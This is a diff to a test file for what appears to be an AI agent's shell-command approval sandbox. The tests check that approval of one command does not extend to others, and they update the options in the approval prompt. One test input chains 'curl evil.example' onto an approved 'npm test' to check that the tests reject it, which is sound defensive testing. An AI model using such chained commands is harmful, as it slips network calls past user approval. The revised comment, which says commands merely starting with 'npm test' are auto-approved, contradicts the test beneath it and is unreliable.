@@ -103,7 +103,7 @@ for (const [label, seams] of [
     const shell = runtimeShell(terminal.value, sandbox, new SandboxStore(context.stateDirectory));
     expect(await shell.approve!("npm test")).toBe(SHELL_DECLINED);
     expect(await shell.approve!("npm test")).toBeUndefined();
-    // The same exact command runs without asking again; any other still asks.
+    // Commands starting with npm test run without asking again; any other still asks.
     expect(await shell.approve!("npm test")).toBeUndefined();
     // Any other command still asks; Enter or Esc (no answer) runs nothing.
     expect(await shell.approve!("npm test; curl evil.example")).toBe(SHELL_DECLINED);
@@ -218,7 +218,7 @@ test("the AI's first command after the sandbox fails to start asks too, and a on
     const wrapping = shell.wrap("rm -rf build", project);
     if (expected) await expect(wrapping).rejects.toThrow(expected);
     else expect(await wrapping).toEqual({ command: "rm -rf build" });
-    expect(terminal.asked).toEqual([{ question: "Run this command?  rm -rf build", options: ["No", "Yes, this once", "Yes, always for this project"] }]);
+    expect(terminal.asked).toEqual([{ question: "Run this command?  rm -rf build", options: ["No", "Yes, this once", "Yes, for this session", "Yes, always for this project"] }]);
     await sandbox.close();
   }
   const { home, project, context } = await fixture();
